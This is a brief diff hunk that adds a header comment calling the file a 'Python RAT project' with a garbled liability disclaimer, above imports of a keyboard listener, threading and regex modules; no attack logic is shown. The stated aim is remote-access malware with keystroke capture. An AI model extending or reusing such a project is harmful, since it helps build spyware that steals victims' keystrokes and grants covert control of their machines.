@@ -1,3 +1,6 @@
+# Python RAT project by average-joe44
+# Does NOT Responsible for any use case!
+
 from pynput.keyboard import Listener
 import threading
 import re
